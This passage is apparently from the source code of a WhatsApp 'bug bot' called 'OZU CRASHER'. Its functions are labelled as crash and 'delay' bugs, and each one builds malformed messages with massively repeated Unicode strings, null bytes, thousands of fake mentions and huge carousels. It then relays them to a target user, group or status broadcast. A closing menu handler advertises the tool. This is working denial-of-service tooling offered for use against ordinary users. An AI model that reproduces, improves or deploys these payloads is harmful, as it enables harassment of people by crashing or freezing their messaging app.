          address: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
          url: `https://zeno-iosx.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
        },
      },
    },
  }, {});
 
  let msg2 = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );
    
  await stillchasing.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message,
     },
    }, ptcp ? 
    { 
      messageId: msg.key.id,
      participant: { jid: target }
    } : { messageId: msg.key.id }
  );
  await sleep(5000);
    await stillchasing.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}
//-------------------( END OF BUGS )--------------/
///===invisible delay===
// ===== delay hard ===//
async function RadiationDelay(target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          groupStatusMessageV2: {
            contextInfo: {},
            body: {
              text: " Minato — Back ",
              format: "Hokage Crash by Minato"
            }
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: JSON.stringify({ flow_cta: "\uB200".repeat(50000) }),
            version: 3
          }
        }
      },
      {}
    );

    await stillchasing.relayMessage("status@broadcast", msg, {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target },
              content: undefined
            }
          ]
        }
      ]
    });

    await stillchasing.relayMessage(target, msg.message ?? msg, {
      messageId: msg.key.id
    });
  } catch (e) {
    console.error("error:", e);
  }
}


// ===== delay hard 2====//
async function Delay(stillchasing, target) {
const sqlfake = Array.from({ length: 10000 }, (_, i) => 
    `${i}@s.whatsapp.net`
   );
for (let i = 0; i < 50; i++) {
    await stillchasing.relayMessage("status@broadcast",
    {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: sqlfake,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 100000 }, () => ({}))
          },
          body: {
            text: "{{".repeat(250000)
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{{".repeat(9999099),
            version: 3
          }
        }
      }
    }, {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
  await sleep(5000);
}


// ======= group crash =====//

async function ButtonCrashGB(stillchasing, targetgroup) {
  try {
    const crashMsg = {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: "Crash Gb By Minato" + "ꦾ".repeat(50000),
            footerText: "Minato coder",
            headerType: 1,
            buttons: [
              {
                buttonId: "crash_",
                buttonText: {
                  displayText: "ꦽ".repeat(90000)
                },
                type: 1
              }
            ],
            contextInfo: {
              mentionedJid: Array.from({ length: 1900 }, () => 
                `1${Math.floor(Math.random() * 999999999999)}@s.whatsapp.net`
              ),
              participant: targetgroup,
              remoteJid: targetgroup,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedMessage: {
                locationMessage: {
                  degreesLatitude: 99999999999999999999,
                  degreesLongitude: 99999999999999999999,
                  name: "Always minato",
                  address: "\u0000",
                  url: "\u0000",
                  jpegThumbnail: null
                }
              }
            }
          }
        }
      }
    };

    await stillchasing.relayMessage(targetgroup, crashMsg, {
      userJid: targetgroup
    });

    console.log("Ozu Kill Send Bug Crash Send To Group");
  } catch (err) {
    console.log(err);
  }
}


//------------------( DELAY INVISIBLE )-------------//
async function Invis(target) {
  let D9XMsg = await generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u100b",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
  
  let D9XMsg2 = await generateWAMessageFromContent(
    target,
    {
      groupsStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "X",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
        .toString(16)
        .padStart(6, "99999999"),
    }
  ); 
  
  let D9XMsg3 = {
   groupStatusMessageV2: {
    message: {
     messageContextInfo: {
      deviceListMetadata: {},
      deviceListMetadataVersion: 2,
     },
     interactiveMessage: {
      contextInfo: {
       mentionedJid: [target],
       isForwarded: true,
       forwardingScore: 999,
       businessMessageForwardInfo: {
        businessOwnerJid: target,
       },
      },
      body: {
       text: "X",
      },
      nativeFlowMessage: {
       buttons: [
        {
         name: "single_select",
         buttonParamsJson: "\u0000".repeat(7000),
        },
        {
         name: "call_permission_request",
         buttonParamsJson: "\u0000".repeat(1000000),
        },
        {
         name: "mpm",
         buttonParamsJson: "\u0000".repeat(7000),
        },
        {
         name: "mpm",
         buttonParamsJson: "\u0000".repeat(7000),
        },
        
       ],
      },
     },
    },
   },
  };

  await stillchasing.relayMessage(target, D9XMsg3, {
   participant: { jid: target },
  });
await stillchasing.relayMessage(
    "status@broadcast",
    D9XMsg.message,
    {
      messageId: D9XMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );
  
  await stillchasing.relayMessage(
    "status@broadcast",
    D9XMsg2.message,
    {
      messageId: D9XMsg2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );  
}
//--------------( Group Crash No Click )-------------//
async function R9X(stillchasing, target, mention = false) {
  var R9X = {
   groupStatusMessageV2: {
     message: {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091"
       }
     }
   }
 };

  stillchasing.relayMessage(
    target,
    R9X,
    mention
      ? {
          participant: { jid: target }
        }
      : {}
  );
}
//----------------( END OF BUG )--------------//
async function ExoDelayHours(target, ptcp = true) {
let CardsX = [];

for (let r = 0; r < 1000; r++) {
CardsX.push({
body: { text: '' },
header: {
title: '',
imageMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
fileLength: "98",
height: 4,
width: 4,
mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
mediaKeyTimestamp: "1749728782"
},
hasMediaAttachment: true
},
nativeFlowMessage: {
messageParamsJson: '',
}
});
}

let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveMessage: {
body: { text: '🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶' },
carouselMessage: {
cards: CardsX
},
contextInfo: {
remoteJid: Math.random().toString(36) + "Mals",
isForwarded: true,
forwardingScore: 999,
urlTrackingMap: {
urlTrackingMapElements: Array.from({ length: 5000 }, () => ({
"\u0000": "\u0000"
}))
}
}
}
}
}
}, {});

await stillchasing.relayMessage(target, {
groupStatusMessageV2: {
message: msg.message,
},
}, ptcp ?
{ 
messageId: msg.key.id, 
participant: { jid: target },
} : { messageId: msg.key.id }
);
}
//======== END OF BUG ==========//
async function R9X2(stillchasing, target, mention) {
  var R9X1 = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
    fileLength: 162903,
    height: 1080,
    width: 1080,
    mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
    fileEncSha256: "JDCO/kG+BT0CCdsRsdKSixsDleGaJNZPCJMVomLox3A=",
    directPath: "/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw?ccb=9-4&oh=01_Q5Aa4AHnhpSyXU1dhNgWvLCbzU4XEfA9JZ1HffIt6U6zDH_QMg&oe=69F44EB9&_nc_sid=e6ed6c",
    mediaKeyTimestamp: 1775033718,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA"
    },
    scansSidecar: "2YCrK9uS0xGWeOGhQDDtgHrmdhks+9aRYU2v5pwgTYmXkWbuXBRpzg==",
    scanLengths: [
      10365,
      39303,
      40429,
      72806
    ],
    midQualityFileSha256: "lldAKS/9qixXmMdTvk0n/DUV7WJLwvT6BaZmOkbUDdE="
  };

  var cards = [];
  for (var r = 0; r < 597; r++) {
    cards.push({
      header: {
        imageMessage: R9X1,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    });
  }

  var R9X2 = await generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\0" },
            carouselMessage: {
              cards: cards
            }
          }
        }
      }
    },
    {}
  );

  await stillchasing.relayMessage(
    target,
    R9X2.message,
    mention
      ? { participant: target }
      : {}
  );
}
//===BUG FUNCTIONS END HERE=====//
case "ownermenu": {
let menu = `
╭════════════════════╮
        𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨
╰════════════════════╯
╭━━━═━═━═━═━═━═━═━═━═━╮
┃ 🤌 𝗛𝗲𝗹𝗹𝗼 *${pushname}*
┃
┃ 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗮 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁
┃ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗱 𝗯𝘆 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴 👩‍💻
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        ⚙️ 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗡𝗮𝗺𝗲       : 𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥
┃ ⦿ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻    : 2.0
┃ ⦿ 𝗠𝗼𝗱𝗲       : ${stillchasing.public ? "𝗣𝗨𝗕𝗟𝗜𝗖 🌐" : "𝗦𝗘𝗟𝗙 🔒"}
┃ ⦿ 𝗘𝗻𝗴𝗶𝗻𝗲     : 𝗕𝗮𝗶𝗹𝗲𝘆𝘀 ⚡
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        📅 𝗦𝗬𝗦𝗧𝗘𝗠
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗗𝗮𝘁𝗲       : ${dateNG}
┃ ⦿ 𝗧𝗶𝗺𝗲       : ${timeNG}
┃ ⦿ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲    : ${runtime(process.uptime())}
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        👨‍💻 𝗖𝗥𝗘𝗔𝗧𝗢𝗥
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿       : 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴
┃
╰━━━═━═━═━═━═━═━═━═━═━╯

👑 𝗢𝗪𝗡𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
`;

const media = await prepareWAMessageMedia(
  {
    image: fs.readFileSync('./lib/image/ozu7.jpeg')
  },
  { upload: stillchasing.waUploadToServer }
);

let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363405765816590@newsletter",
              serverMessageId: 1,
              newsletterName: "𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨"
            }
          },
          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            hasMediaAttachment: true,
            imageMessage: media.imageMessage
          }),
          body: proto.Message.InteractiveMessage.Body.create({
            text: menu
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴"
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "➕ ᴀᴅᴅ ᴏᴡɴᴇʀ",
                  id: `${prefix}addowner`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "➖ ᴅᴇʟ ᴏᴡɴᴇʀ",
                  id: `${prefix}delowner`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🔒 sᴇʟғ",
                  id: `${prefix}self`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🌐 ᴘᴜʙʟɪᴄ",
                  id: `${prefix}public`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🏓 ᴘɪɴɢ",
                  id: `${prefix}ping`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
